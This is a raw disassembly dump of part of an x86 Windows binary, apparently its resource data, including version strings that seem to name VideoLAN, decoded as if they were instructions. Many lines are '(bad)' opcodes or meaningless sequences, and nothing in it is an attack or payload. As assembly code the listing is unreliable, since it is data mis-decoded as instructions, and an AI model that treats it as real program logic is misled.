  4256e7:	add    BYTE PTR [esi-0x2983736e],dl
  4256ed:	aam    0xd0
  4256ef:	(bad)  
  4256f0:	fcmovbe st,st(7)
  4256f2:	sar    edi,cl
  4256f4:	in     eax,0xe3
  4256f6:	(bad)  
  4256f8:	fcmovnu st,st(0)
  4256fa:	sar    edi,cl
  4256fc:	loopne 0x4256db
  4256fe:	fcos   
  425700:	mov    ecx,0xafffadb4
  425705:	lods   al,BYTE PTR ds:[esi]
  425706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425707:	mov    eax,DWORD PTR [eax]
	...
  425765:	add    BYTE PTR [eax],al
  425767:	add    BYTE PTR [esi-0x3ebf5955],ch
  42576d:	mov    ecx,0xe6edfdb0
  425772:	fdivp  st(7),st
  425774:	out    0xdd,al
  425776:	sar    edi,1
  425778:	in     eax,dx
  425779:	out    0xde,al
  42577b:	(bad)  
  42577c:	fst    st(2)
  42577e:	(bad)  
  425781:	lds    edi,FWORD PTR [ebp-0x736c6702]
  425787:	xor    DWORD PTR [eax],eax
	...
  4257e5:	add    BYTE PTR [eax],al
  4257e7:	add    BYTE PTR [ebp+ecx*4-0x6073f975],cl
  4257ee:	mov    dl,0xdd
  4257f0:	addr16 test eax,0xa25effe1
  4257f6:	call   0xe9e5acfa
  4257fb:	jmp    FWORD PTR [ebx-0x59]
  4257fe:	fdivp  st(7),st
  425800:	jp     0x42578e
  425802:	mov    ds:0x888b8bd5,eax
  425807:	add    al,0x0
	...
  425869:	add    BYTE PTR [eax],al
  42586b:	add    BYTE PTR [eax],cl
  42586d:	push   ebx
  42586e:	mov    al,0x96
  425870:	add    BYTE PTR [ecx-0x18],dh
  425873:	inc    DWORD PTR [eax]
  425875:	jno    0x42586b
  425877:	inc    DWORD PTR [eax]
  425879:	jle    0x425874
  42587b:	inc    DWORD PTR [eax]
  42587d:	outs   dx,BYTE PTR ds:[esi]
  42587e:	in     eax,dx
  42587f:	dec    DWORD PTR [ecx]
  425881:	dec    edi
  425882:	scas   eax,DWORD PTR es:[edi]
  425883:	cwde   
	...
  4258ec:	adc    DWORD PTR [ecx-0x5c],edx
  4258ef:	dec    esp
  4258f0:	add    BYTE PTR [edi-0x23],ch
  4258f3:	inc    DWORD PTR [eax]
  4258f5:	jns    0x4258eb
  4258f7:	inc    DWORD PTR [eax]
  4258f9:	cmp    eax,0xffffffff
  4258fc:	add    BYTE PTR [ecx-0x21],ch
  4258ff:	call   DWORD PTR [ecx]
  425901:	dec    edi
  425902:	mov    ds:0x50,eax
	...
  42596b:	add    BYTE PTR [edi],bl
  42596d:	pop    ebp
  42596e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42596f:	adc    BYTE PTR [edx],al
  425971:	data16 shr ch,1
  425974:	add    BYTE PTR [edi+esi*8-0x1],bh
  425978:	add    BYTE PTR [esi+0x6001fffc],al
  42597e:	shl    cl,1
  425980:	adc    eax,0x139e54
	...
  4259ed:	add    BYTE PTR [eax],al
  4259ef:	add    BYTE PTR [eax],dl
  4259f1:	popa   
  4259f2:	shl    DWORD PTR [eax+eax*1+0x67],0xde
  4259f7:	fild   DWORD PTR [ecx]
  4259f9:	ins    DWORD PTR es:[edi],dx
  4259fa:	(bad)  
  4259fc:	or     bl,BYTE PTR [edi-0x3f]
  4259ff:	ja     0x425a01
	...
  425ab5:	add    BYTE PTR [eax],al
  425ab7:	add    bh,bh
  425ab9:	(bad)  
  425aba:	(bad)  
  425abb:	jmp    eax
  425abd:	add    BYTE PTR [eax],al
  425abf:	pop    es
  425ac0:	loopne 0x425ac2
  425ac2:	add    BYTE PTR [edi],al
  425ac4:	loopne 0x425ac6
  425ac6:	add    BYTE PTR [edi],al
  425ac8:	loopne 0x425aca
  425aca:	add    BYTE PTR [edi],al
  425acc:	loopne 0x425ace
  425ace:	add    BYTE PTR [edi],al
  425ad0:	loopne 0x425ad2
  425ad2:	add    BYTE PTR [edi],al
  425ad4:	lock add BYTE PTR [eax],al
  425ad7:	(bad)  
  425ad9:	add    BYTE PTR [eax],al
  425adb:	(bad)  
  425add:	add    BYTE PTR [eax],al
  425adf:	psubb  mm0,QWORD PTR [eax]
  425ae2:	add    BYTE PTR [edi],bl
  425ae4:	clc    
  425ae5:	add    BYTE PTR [eax],al
  425ae7:	pop    ds
  425ae8:	clc    
  425ae9:	add    BYTE PTR [eax],al
  425aeb:	pop    ds
  425aec:	inc    DWORD PTR [eax-0x7f0000ff]
  425af2:	add    edi,edi
  425af4:	inc    DWORD PTR [eax-0x7f0000ff]
  425afa:	add    edi,edi
  425afc:	inc    eax
  425afe:	add    edi,edi
  425b00:	inc    eax
  425b02:	add    edi,edi
  425b04:	inc    eax
  425b06:	add    edi,edi
  425b08:	jmp    eax
  425b0a:	pop    es
  425b0b:	(bad)  
  425b0c:	jmp    eax
  425b0e:	pop    es
  425b0f:	(bad)  
  425b10:	jmp    eax
  425b12:	pop    es
  425b13:	(bad)  
  425b14:	push   eax
  425b16:	ud0    edi,edi
  425b19:	lock ud0 edi,edi
  425b1d:	lock ud0 edi,edi
  425b21:	lock ud0 edi,edi
  425b25:	clc    
  425b26:	pop    ds
  425b27:	(bad)  
  425b28:	(bad)  
  425b29:	clc    
  425b2a:	pop    ds
  425b2b:	(bad)  
  425b2c:	(bad)  
  425b2d:	clc    
  425b2e:	pop    ds
  425b2f:	(bad)  
  425b30:	(bad)  
  425b31:	cld    
  425b32:	aas    
  425b33:	(bad)  
  425b34:	(bad)  
  425b35:	(bad)  
  425b36:	(bad)  
  425b37:	jmp    FWORD PTR [eax]
  425b39:	add    BYTE PTR [eax],al
  425b3b:	add    BYTE PTR [eax],dl
  425b3d:	add    BYTE PTR [eax],al
  425b3f:	add    BYTE PTR [eax],ah
  425b41:	add    BYTE PTR [eax],al
  425b43:	add    BYTE PTR [ecx],al
  425b45:	add    BYTE PTR [eax],ah
  425b47:	add    BYTE PTR [eax],al
  425b49:	add    BYTE PTR [eax],al
  425b4b:	add    BYTE PTR [eax+0x4],al
	...
  425b62:	add    BYTE PTR [eax],al
  425b64:	or     BYTE PTR [esp+esi*4+0x64],bl
  425b68:	add    BYTE PTR [eax-0x3b],bl
  425b6b:	inc    DWORD PTR [eax]
  425b6d:	pop    eax
  425b6e:	(bad)  
  425b71:	pop    eax
  425b72:	(bad)  
  425b75:	pop    eax
  425b76:	(bad)  
  425b79:	pop    eax
  425b7a:	(bad)  
  425b7d:	pop    eax
  425b7e:	(bad)  
  425b81:	pop    eax
  425b82:	(bad)  
  425b85:	pop    eax
  425b86:	(bad)  
  425b89:	pop    eax
  425b8a:	(bad)  
  425b8d:	pop    eax
  425b8e:	(bad)  
  425b91:	pop    eax
  425b92:	(bad)  
  425b95:	pop    eax
  425b96:	(bad)  
  425b99:	mov    si,0x66
  425b9d:	add    BYTE PTR [eax],al
  425b9f:	add    BYTE PTR [eax],al
  425ba1:	add    BYTE PTR [eax],al
  425ba3:	add    BYTE PTR [esi],dh
  425ba5:	mov    ecx,0xb51a8afb
  425baa:	(bad)  
  425bab:	call   FWORD PTR [edx]
  425bad:	mov    ch,0xff
  425baf:	call   FWORD PTR [edx]
  425bb1:	lods   al,BYTE PTR ds:[esi]
  425bb2:	(bad)  
  425bb3:	call   FWORD PTR [edx]
  425bb5:	mov    al,ds:0xa01affff
  425bba:	(bad)  
  425bbb:	call   FWORD PTR [edx]
  425bbd:	sahf   
  425bbe:	(bad)  
  425bbf:	call   FWORD PTR [edx]
  425bc1:	lahf   
  425bc2:	(bad)  
  425bc3:	call   FWORD PTR [edx]
  425bc5:	mov    ds:0xa31affff,eax
  425bca:	(bad)  
  425bcb:	call   FWORD PTR [edx]
  425bcd:	scas   al,BYTE PTR es:[edi]
  425bce:	(bad)  
  425bcf:	call   FWORD PTR [edx]
  425bd1:	mov    edx,0xbd1affff
  425bd6:	(bad)  
  425bd7:	push   DWORD PTR [ebx]
  425bd9:	(bad)  
  425bda:	dec    DWORD PTR [edi+0x0]
  425be0:	add    BYTE PTR [eax],al
  425be2:	add    BYTE PTR [eax],al
  425be4:	jae    0x425ba5
  425be6:	out    dx,eax
  425be7:	xor    al,BYTE PTR [eax]
  425be9:	nop
  425bea:	clc    
  425beb:	inc    DWORD PTR [eax]
  425bed:	(bad)  
  425bee:	clc    
  425bef:	inc    DWORD PTR [eax]
  425bf1:	ja     0x425be2
  425bf3:	inc    DWORD PTR [eax]
  425bf5:	push   0xffffffe7
  425bf7:	inc    DWORD PTR [eax]
  425bf9:	callw  0x5cfc
  425bfd:	gs jmp 0xff:0xee6b00ff
  425c05:	jae    0x425bf7
  425c07:	inc    DWORD PTR [eax]
  425c09:	jbe    0x425bf9
  425c0b:	inc    DWORD PTR [eax]
  425c0d:	jnp    0x425c00
  425c0f:	inc    DWORD PTR [eax]
  425c11:	xchg   edx,eax
  425c12:	cli    
  425c13:	inc    DWORD PTR [eax]
  425c15:	call   0x38f6:0xce7dfffb
	...
  425c24:	cmp    DWORD PTR [edi-0x73ecfc1a],0xfffffff1
  425c2b:	fild   DWORD PTR [eax]
  425c2d:	addr16 fdivp st(7),st
  425c30:	add    BYTE PTR [edx-0x3f],cl
  425c33:	inc    DWORD PTR [eax]
  425c35:	pop    edx
  425c36:	fcos   
  425c38:	add    BYTE PTR [edx-0x1d],ah
  425c3b:	inc    DWORD PTR [ecx]
  425c3d:	out    0xff,ax
  425c40:	add    dh,BYTE PTR [eax-0x14]
  425c43:	inc    DWORD PTR [eax]
  425c45:	jno    0x425c36
  425c47:	inc    DWORD PTR [eax]
  425c49:	pop    esi
  425c4a:	loope  0x425c4b
  425c4c:	add    BYTE PTR [ebx+edi*4-0x1],al
  425c50:	add    BYTE PTR [eax-0x2a],ah
  425c53:	dec    DWORD PTR [edi]
  425c55:	mov    esi,ebp
  425c57:	loope  0x425be1
  425c59:	(bad)  
  425c5a:	jmp    0x425c64
	...
  425c67:	add    BYTE PTR [ecx],dh
  425c69:	xchg   ebx,eax
  425c6a:	jmp    0xeff:0xd5580092
  425c71:	dec    esp
  425c72:	mov    dl,0xff
  425c74:	bound  edx,QWORD PTR [ecx-0x4b620037]
  425c7a:	retf   
  425c7b:	push   DWORD PTR [ebx-0x4b003542]
  425c81:	ror    esp,0xff
  425c84:	fwait
  425c85:	mov    ah,0xca
  425c87:	call   FWORD PTR [esi-0x74]
  425c8a:	ret    
  425c8b:	dec    DWORD PTR [esi]
  425c8d:	inc    ebp
  425c8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c8f:	inc    DWORD PTR [eax]
  425c91:	aas    
  425c92:	mov    ebx,0xd17223ff
  425c97:	call   0x0:0x0
	...
  425ca6:	add    BYTE PTR [eax],al
  425ca8:	pusha  
  425ca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425caa:	loop   0x425ce8
  425cac:	add    ah,BYTE PTR [ebx-0x1b]
  425caf:	repz pusha 
  425cb1:	jnp    0x425c55
  425cb3:	dec    bh
  425cb5:	ret    
  425cb6:	mov    bl,0xff
  425cb8:	aam    0xcd
  425cba:	(bad)  
  425cbb:	call   edi
  425cbd:	rol    dh,1
  425cbf:	(bad)  
  425cc0:	fcom   st(1)
  425cc2:	enter  0xd0ff,0xc8
  425cc6:	mov    edi,0xa6b7c1ff
  425ccb:	call   FWORD PTR [edi+0x70]
  425cce:	nop
  425ccf:	inc    BYTE PTR [eax]
  425cd1:	inc    ebx
  425cd2:	(bad)
  425cd5:	js     0x425c93
  425cd7:	inc    edx
	...
  425cec:	push   ebx
  425ced:	popf   
  425cee:	fst    QWORD PTR [ecx]
  425cf0:	or     BYTE PTR [ebp-0x453b7e6d],0xae
  425cf7:	dec    esi
  425cf9:	int3   
  425cfa:	(bad)  
  425cfb:	inc    esi
  425cfd:	leave  
  425cfe:	int    0xff
  425d00:	(bad)  
  425d01:	retf   
  425d02:	into   
  425d03:	dec    eax
  425d05:	mov    cl,0xff
  425d08:	mov    eax,0x7fffa2af
  425d0d:	xchg   BYTE PTR [edx-0x5094d57b],cl
  425d13:	adc    DWORD PTR [eax],eax
	...
  425d2d:	add    BYTE PTR [eax],al
  425d2f:	add    BYTE PTR [esi+0x522e868e],dl
  425d35:	xor    BYTE PTR [esi-0x1c81df01],0xff
  425d3c:	or     al,0x75
  425d3e:	out    dx,al
  425d3f:	dec    DWORD PTR [edx+eax*4]
  425d42:	repnz call FWORD PTR [esi]
  425d45:	sub    eax,0xffffffff
  425d48:	dec    ebx
  425d49:	je     0x425cfa
  425d4b:	call   DWORD PTR [ebp+0x33878f]
	...
  425d6d:	add    BYTE PTR [eax],al
  425d6f:	add    BYTE PTR [esi],ah
  425d71:	pop    ecx
  425d72:	xchg   esi,eax
  425d73:	add    eax,DWORD PTR [eax]
  425d75:	dec    esi
  425d76:	mov    ecx,0xe76f00db
  425d7b:	inc    DWORD PTR [eax]
  425d7d:	jo     0x425d70
  425d7f:	inc    DWORD PTR [eax]
  425d81:	jg     0x425d79
  425d83:	inc    DWORD PTR [eax]
  425d85:	je     0x425d75
  425d87:	inc    DWORD PTR [eax]
  425d89:	inc    ebp
  425d8a:	mov    ah,0xe0
  425d8c:	sub    BYTE PTR [ebx-0x68],bl
  425d8f:	add    eax,0x0
	...
  425db4:	or     BYTE PTR [edi-0x55],cl
  425db7:	xchg   esp,eax
  425db8:	add    BYTE PTR [ebx-0x1c],ch
  425dbb:	inc    DWORD PTR [eax]
  425dbd:	jo     0x425db1
  425dbf:	inc    DWORD PTR [eax]
  425dc1:	jg     0x425dbb
  425dc3:	inc    DWORD PTR [eax]
  425dc5:	push   0xffffffe8
  425dc7:	inc    DWORD PTR [edi]
  425dc9:	inc    edi
  425dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425dcb:	fwait
	...
  425df4:	xor    DWORD PTR [ecx-0x64],esp
  425df7:	inc    esi
  425df8:	ja     0x425d9a
  425dfa:	retf   0xa8ff
  425dfd:	rcr    edx,0xff
  425e00:	test   al,0xc4
  425e02:	fcos   
  425e04:	jae    0x425d9d
  425e06:	ret    0x30ff
  425e09:	pop    ebp
  425e0a:	cdq    
  425e0b:	dec    ebp
	...
  425e34:	xchg   edi,eax
  425e35:	xchg   ecx,eax
  425e36:	mov    DWORD PTR [esp+eax*8],ecx
  425e39:	mov    ebx,0xdde5edaf
  425e3e:	sar    edi,cl
  425e40:	loop   0x425e1b
  425e42:	iret   
  425e43:	(bad)  
  425e44:	mov    ebp,0x97f0a6b2
  425e49:	xchg   edx,eax
  425e4a:	mov    dl,BYTE PTR [eax]
	...
  425e78:	mov    dl,0xab
  425e7a:	mov    eax,ds:0xd4dce1ae
  425e7f:	(bad)  
  425e80:	fst    st(7)
  425e82:	into   
  425e83:	jmp    FWORD PTR [edi+0xb59ba6]
	...
  425eb5:	add    BYTE PTR [eax],al
  425eb7:	add    BYTE PTR [esp+esi*2-0x5e],cl
  425ebb:	pusha  
  425ebc:	sub    eax,0x2bffe98b
  425ec1:	mov    edx,gs
  425ec3:	dec    DWORD PTR [ebx+0x72]
  425ec6:	mov    ds:0x67,al
	...
  425ef7:	add    BYTE PTR [ecx],dl
  425ef9:	push   esi
  425efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425efb:	sbb    al,0x0
  425efd:	jo     0x425ee6
  425eff:	inc    DWORD PTR [eax]
  425f01:	jb     0x425eee
  425f03:	dec    DWORD PTR ds:0x21a350
	...
  425f39:	add    BYTE PTR [eax],al
  425f3b:	add    BYTE PTR [eax],cl
  425f3d:	sar    BYTE PTR [si+0x4],1
  425f41:	rol    BYTE PTR gs:[eax+0x0],1
	...
  425f60:	add    BYTE PTR [ecx],0x0
  425f63:	add    BYTE PTR [eax-0x7fffffff],al
  425f69:	add    DWORD PTR [eax],eax
  425f6b:	add    BYTE PTR [eax-0x3fffffff],al
  425f71:	add    eax,DWORD PTR [eax]
  425f73:	add    al,al
  425f75:	add    eax,DWORD PTR [eax]
  425f77:	add    al,ah
  425f79:	pop    es
  425f7a:	add    BYTE PTR [eax],al
  425f7c:	lock sldt WORD PTR [eax]
  425f80:	lock sldt WORD PTR [eax]
  425f84:	clc    
  425f85:	pop    ds
  425f86:	add    BYTE PTR [eax],al
  425f88:	clc    
  425f89:	pop    ds
  425f8a:	add    BYTE PTR [eax],al
  425f8c:	clc    
  425f8d:	pop    ds
  425f8e:	add    BYTE PTR [eax],al
  425f90:	cld    
  425f91:	aas    
  425f92:	add    BYTE PTR [eax],al
  425f94:	cld    
  425f95:	aas    
  425f96:	add    BYTE PTR [eax],al
  425f98:	cld    
  425f99:	aas    
  425f9a:	add    BYTE PTR [eax],al
  425f9c:	(bad)  
  425f9d:	jg     0x425f9f
  425f9f:	add    BYTE PTR [eax],al
  425fa1:	add    BYTE PTR [ecx],al
  425fa3:	add    BYTE PTR [esi],al
  425fa5:	add    BYTE PTR [eax],ah
  425fa7:	and    BYTE PTR [eax],al
  425fa9:	add    BYTE PTR [ecx],al
  425fab:	add    BYTE PTR [eax],cl
  425fad:	add    BYTE PTR [eax+0x1000008],ch
  425fb3:	add    BYTE PTR [eax],dl
  425fb5:	adc    BYTE PTR [eax],al
  425fb7:	add    BYTE PTR [ecx],al
  425fb9:	add    BYTE PTR [eax],cl
  425fbb:	add    BYTE PTR [eax+0x5],ch
  425fbe:	add    BYTE PTR [eax],al
  425fc0:	add    al,BYTE PTR [eax]
  425fc2:	add    BYTE PTR [eax],al
  425fc4:	add    BYTE PTR [eax],al
  425fc6:	add    DWORD PTR [eax],eax
  425fc8:	and    BYTE PTR [eax],al
  425fca:	sahf   
  425fcb:	aam    0x0
  425fcd:	add    BYTE PTR [ebx],al
  425fcf:	add    BYTE PTR [eax],dh
  425fd1:	xor    BYTE PTR [eax],al
  425fd3:	add    BYTE PTR [ecx],al
  425fd5:	add    BYTE PTR [eax],ah
  425fd7:	add    BYTE PTR [eax+0x4000025],ch
  425fdd:	add    BYTE PTR [eax],ah
  425fdf:	and    BYTE PTR [eax],al
  425fe1:	add    BYTE PTR [ecx],al
  425fe3:	add    BYTE PTR [eax],ah
  425fe5:	add    BYTE PTR [eax+0x5000010],ch
  425feb:	add    BYTE PTR [eax],dl
  425fed:	adc    BYTE PTR [eax],al
  425fef:	add    BYTE PTR [ecx],al
  425ff1:	add    BYTE PTR [eax],ah
  425ff3:	add    BYTE PTR [eax+0x4],ch
  425ff6:	add    BYTE PTR [eax],al
  425ff8:	push   es
  425ff9:	add    BYTE PTR [eax],al
  425ffb:	add    BYTE PTR [eax],al
  425ffd:	add    BYTE PTR [eax],al
  425fff:	add    BYTE PTR [ebx+eax*1+0x34],ah
  426006:	push   esi
  426007:	add    BYTE PTR [ebx+0x0],dl
  42600a:	pop    edi
  42600b:	add    BYTE PTR [esi+0x0],dl
  42600e:	inc    ebp
  42600f:	add    BYTE PTR [edx+0x0],dl
  426012:	push   ebx
  426013:	add    BYTE PTR [ecx+0x0],cl
  426016:	dec    edi
  426017:	add    BYTE PTR [esi+0x0],cl
  42601a:	pop    edi
  42601b:	add    BYTE PTR [ecx+0x0],cl
  42601e:	dec    esi
  42601f:	add    BYTE PTR [esi+0x0],al
  426022:	dec    edi
  426023:	add    BYTE PTR [eax],al
  426025:	add    BYTE PTR [eax],al
  426027:	add    BYTE PTR [ebp+0xfeef04],bh
  42602d:	add    BYTE PTR [ecx],al
  42602f:	add    BYTE PTR [edx],al
  426031:	add    BYTE PTR [edx],al
  426033:	add    BYTE PTR [eax],al
  426035:	add    BYTE PTR [esi],al
  426037:	add    BYTE PTR [edx],al
  426039:	add    BYTE PTR [edx],al
  42603b:	add    BYTE PTR [eax],al
  42603d:	add    BYTE PTR [esi],al
	...
  426047:	add    BYTE PTR [eax+eax*1],al
  42604a:	add    BYTE PTR [eax],al
  42604c:	add    DWORD PTR [eax],eax
	...
  42605a:	add    BYTE PTR [eax],al
  42605c:	add    al,0x3
  42605e:	add    BYTE PTR [eax],al
  426060:	add    DWORD PTR [eax],eax
  426062:	push   ebx
  426063:	add    BYTE PTR [eax+eax*1+0x72],dh
  426067:	add    BYTE PTR [ecx+0x0],ch
  42606a:	outs   dx,BYTE PTR ds:[esi]
  42606b:	add    BYTE PTR [edi+0x0],ah
  42606e:	inc    esi
  42606f:	add    BYTE PTR [ecx+0x0],ch
  426072:	ins    BYTE PTR es:[edi],dx
  426073:	add    BYTE PTR [ebp+0x0],ah
  426076:	dec    ecx
  426077:	add    BYTE PTR [esi+0x0],ch
  42607a:	data16 add BYTE PTR [edi+0x0],ch
  42607e:	add    BYTE PTR [eax],al
  426080:	loopne 0x426084
  426082:	add    BYTE PTR [eax],al
  426084:	add    DWORD PTR [eax],eax
  426086:	xor    BYTE PTR [eax],al
  426088:	xor    al,0x0
  42608a:	xor    BYTE PTR [eax],al
  42608c:	cmp    DWORD PTR [eax],eax
  42608e:	xor    BYTE PTR [eax],al
  426090:	xor    al,0x0
  426092:	inc    ebp
  426093:	add    BYTE PTR [eax+eax*1],dh
  426096:	add    BYTE PTR [eax],al
  426098:	xor    al,BYTE PTR [eax]
  42609a:	or     DWORD PTR [eax],eax
  42609c:	add    DWORD PTR [eax],eax
  42609e:	inc    ebx
  42609f:	add    BYTE PTR [edi+0x0],ch
  4260a2:	ins    DWORD PTR es:[edi],dx
  4260a3:	add    BYTE PTR [eax+0x0],dh
  4260a6:	popa   
  4260a7:	add    BYTE PTR [esi+0x0],ch
  4260aa:	jns    0x4260ac
  4260ac:	dec    esi
  4260ad:	add    BYTE PTR [ecx+0x0],ah
  4260b0:	ins    DWORD PTR es:[edi],dx
  4260b1:	add    BYTE PTR [ebp+0x0],ah
  4260b4:	add    BYTE PTR [eax],al
  4260b6:	add    BYTE PTR [eax],al
  4260b8:	push   esi
  4260b9:	add    BYTE PTR [ecx+0x0],ch
  4260bc:	add    BYTE PTR fs:[ebp+0x0],ah
  4260c0:	outs   dx,DWORD PTR ds:[esi]
  4260c1:	add    BYTE PTR [eax+eax*1+0x41],cl
  4260c5:	add    BYTE PTR [esi+0x0],cl
  4260c8:	add    BYTE PTR [eax],al
  4260ca:	add    BYTE PTR [eax],al
  4260cc:	inc    edx
  4260cd:	add    BYTE PTR [ecx],dl
  4260cf:	add    BYTE PTR [ecx],al
  4260d1:	add    BYTE PTR [eax+0x0],dl
  4260d4:	jb     0x4260d6
  4260d6:	outs   dx,DWORD PTR ds:[esi]
  4260d7:	add    BYTE PTR [eax+eax*1+0x75],ah
  4260db:	add    BYTE PTR [ebx+0x0],ah
  4260de:	je     0x4260e0
  4260e0:	dec    esi
  4260e1:	add    BYTE PTR [ecx+0x0],ah
  4260e4:	ins    DWORD PTR es:[edi],dx
  4260e5:	add    BYTE PTR [ebp+0x0],ah
  4260e8:	add    BYTE PTR [eax],al
  4260ea:	add    BYTE PTR [eax],al
  4260ec:	push   esi
  4260ed:	add    BYTE PTR [eax+eax*1+0x43],cl
  4260f1:	add    BYTE PTR [eax],ah
  4260f3:	add    BYTE PTR [ebp+0x0],ch
  4260f6:	add    BYTE PTR gs:[eax+eax*1+0x69],ah
  4260fb:	add    BYTE PTR [ecx+0x0],ah
  4260fe:	and    BYTE PTR [eax],al
  426100:	jo     0x426102
  426102:	ins    BYTE PTR es:[edi],dx
  426103:	add    BYTE PTR [ecx+0x0],ah
  426106:	jns    0x426108
  426108:	add    BYTE PTR gs:[edx+0x0],dh
  42610c:	add    BYTE PTR [eax],al
  42610e:	add    BYTE PTR [eax],al
  426110:	xor    al,0x0
  426112:	or     BYTE PTR [eax],al
  426114:	add    DWORD PTR [eax],eax
  426116:	push   eax
  426117:	add    BYTE PTR [edx+0x0],dh
  42611a:	outs   dx,DWORD PTR ds:[esi]
  42611b:	add    BYTE PTR [eax+eax*1+0x75],ah
  42611f:	add    BYTE PTR [ebx+0x0],ah
  426122:	je     0x426124
  426124:	push   esi
  426125:	add    BYTE PTR [ebp+0x0],ah
  426128:	jb     0x42612a
  42612a:	jae    0x42612c
  42612c:	imul   eax,DWORD PTR [eax],0x6e006f
  426132:	add    BYTE PTR [eax],al
  426134:	xor    al,BYTE PTR [eax]
  426136:	sub    al,0x0
  426138:	xor    al,BYTE PTR [eax]
  42613a:	sub    al,0x0
  42613c:	add    BYTE PTR ss:[eax+eax*1],ch
  426140:	xor    BYTE PTR [eax],al
  426142:	add    BYTE PTR [eax],al
  426144:	sub    BYTE PTR [eax],al
  426146:	add    al,0x0
  426148:	add    DWORD PTR [eax],eax
  42614a:	dec    ecx
  42614b:	add    BYTE PTR [esi+0x0],ch
  42614e:	je     0x426150
  426150:	add    BYTE PTR gs:[edx+0x0],dh
  426154:	outs   dx,BYTE PTR ds:[esi]
  426155:	add    BYTE PTR [ecx+0x0],ah
  426158:	ins    BYTE PTR es:[edi],dx
  426159:	add    BYTE PTR [esi+0x0],cl
  42615c:	popa   
  42615d:	add    BYTE PTR [ebp+0x0],ch
  426160:	add    BYTE PTR gs:[eax],al
  426163:	add    BYTE PTR [esi+0x0],dh
  426166:	ins    BYTE PTR es:[edi],dx
  426167:	add    BYTE PTR [ebx+0x0],ah
  42616a:	add    BYTE PTR [eax],al
  42616c:	cmp    BYTE PTR [eax],al
  42616e:	or     BYTE PTR [eax],al
  426170:	add    DWORD PTR [eax],eax
  426172:	dec    edi
  426173:	add    BYTE PTR [edx+0x0],dh
  426176:	imul   eax,DWORD PTR [eax],0x690067
  42617c:	outs   dx,BYTE PTR ds:[esi]
  42617d:	add    BYTE PTR [ecx+0x0],ah
  426180:	ins    BYTE PTR es:[edi],dx
  426181:	add    BYTE PTR [esi+0x0],al
  426184:	imul   eax,DWORD PTR [eax],0x65006c
  42618a:	outs   dx,BYTE PTR ds:[esi]
  42618b:	add    BYTE PTR [ecx+0x0],ah
  42618e:	ins    DWORD PTR es:[edi],dx
  42618f:	add    BYTE PTR [ebp+0x0],ah
  426192:	add    BYTE PTR [eax],al
  426194:	jbe    0x426196
  426196:	ins    BYTE PTR es:[edi],dx
  426197:	add    BYTE PTR [ebx+0x0],ah
  42619a:	add    BYTE PTR cs:[ebp+0x0],ah
  42619e:	js     0x4261a0
  4261a0:	add    BYTE PTR gs:[eax],al
  4261a3:	add    BYTE PTR [eax+eax*1],ch
  4261a6:	push   es
  4261a7:	add    BYTE PTR [ecx],al
  4261a9:	add    BYTE PTR [esi+0x0],al
  4261ac:	imul   eax,DWORD PTR [eax],0x65006c
  4261b2:	push   esi
  4261b3:	add    BYTE PTR [ebp+0x0],ah
  4261b6:	jb     0x4261b8
  4261b8:	jae    0x4261ba
  4261ba:	imul   eax,DWORD PTR [eax],0x6e006f
  4261c0:	add    BYTE PTR [eax],al
  4261c2:	add    BYTE PTR [eax],al
  4261c4:	xor    al,BYTE PTR [eax]
  4261c6:	add    BYTE PTR cs:[edx],dh
  4261c9:	add    BYTE PTR [esi],ch
  4261cb:	add    BYTE PTR [esi],dh
  4261cd:	add    BYTE PTR [eax],al
  4261cf:	add    BYTE PTR [edx+0x0],cl
  4261d2:	adc    DWORD PTR [eax],eax
  4261d4:	add    DWORD PTR [eax],eax
  4261d6:	inc    esi
  4261d7:	add    BYTE PTR [ecx+0x0],ch
  4261da:	ins    BYTE PTR es:[edi],dx
  4261db:	add    BYTE PTR [ebp+0x0],ah
  4261de:	inc    esp
  4261df:	add    BYTE PTR [ebp+0x0],ah
  4261e2:	jae    0x4261e4
  4261e4:	arpl   WORD PTR [eax],ax
  4261e6:	jb     0x4261e8
  4261e8:	imul   eax,DWORD PTR [eax],0x740070
  4261ee:	imul   eax,DWORD PTR [eax],0x6e006f
  4261f4:	add    BYTE PTR [eax],al
  4261f6:	add    BYTE PTR [eax],al
  4261f8:	push   esi
  4261f9:	add    BYTE PTR [eax+eax*1+0x43],cl
  4261fd:	add    BYTE PTR [eax],ah
  4261ff:	add    BYTE PTR [ebp+0x0],ch
  426202:	add    BYTE PTR gs:[eax+eax*1+0x69],ah
  426207:	add    BYTE PTR [ecx+0x0],ah
  42620a:	and    BYTE PTR [eax],al
  42620c:	jo     0x42620e
  42620e:	ins    BYTE PTR es:[edi],dx
  42620f:	add    BYTE PTR [ecx+0x0],ah
  426212:	jns    0x426214
  426214:	add    BYTE PTR gs:[edx+0x0],dh
  426218:	add    BYTE PTR [eax],al
  42621a:	add    BYTE PTR [eax],al
  42621c:	add    BYTE PTR [eax],0x2f
  42621f:	add    BYTE PTR [ecx],al
  426221:	add    BYTE PTR [eax+eax*1+0x65],cl
  426225:	add    BYTE PTR [edi+0x0],ah
  426228:	popa   
  426229:	add    BYTE PTR [eax+eax*1+0x43],ch
  42622d:	add    BYTE PTR [edi+0x0],ch
  426230:	jo     0x426232
  426232:	jns    0x426234
  426234:	jb     0x426236
  426236:	imul   eax,DWORD PTR [eax],0x680067
  42623c:	je     0x42623e
  42623e:	add    BYTE PTR [eax],al
  426240:	inc    ebx
  426241:	add    BYTE PTR [edi+0x0],ch
  426244:	jo     0x426246
  426246:	jns    0x426248
  426248:	jb     0x42624a
  42624a:	imul   eax,DWORD PTR [eax],0x680067
  426250:	je     0x426252
  426252:	and    BYTE PTR [eax],al
  426254:	test   eax,0x31002000
  426259:	add    BYTE PTR [ecx],bh
  42625b:	add    BYTE PTR [ecx],bh
  42625d:	add    BYTE PTR [esi],dh
  42625f:	add    BYTE PTR ds:0x30003200,ch
  426265:	add    BYTE PTR [ecx],dh
  426267:	add    BYTE PTR [edi],dh
  426269:	add    BYTE PTR [eax],ah
  42626b:	add    BYTE PTR [esi+0x0],dl
  42626e:	imul   eax,DWORD PTR [eax],0x650064
  426274:	outs   dx,DWORD PTR ds:[esi]
  426275:	add    BYTE PTR [eax+eax*1+0x41],cl
  426279:	add    BYTE PTR [esi+0x0],cl
  42627c:	and    BYTE PTR [eax],al
  42627e:	popa   
